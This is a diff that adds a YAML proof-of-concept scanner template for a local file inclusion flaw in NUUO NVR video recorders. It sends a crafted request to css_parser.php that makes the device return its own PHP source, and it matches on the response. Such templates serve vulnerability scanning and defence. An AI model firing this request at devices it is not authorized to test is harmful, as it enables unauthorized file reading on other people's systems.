@@ -1,0 +1,17 @@
+id: poc-yaml-nuuo-local-file-inclusion
+info:
+  name: NUUO NVR 本地文件包含漏洞
+  severity: high
+  tags:
+  - lfi
+  finger: NUUO
+  osprey-id: vb_2019_0067
+requests:
+- method: GET
+  path: /css_parser.php?css=css_parser.php
+  headers: {}
+  expression: 'contains(body, "$_GET[''css'']") &&  contains(content_type, "text/css")
+
+    '
+variables: {}
+transport: http
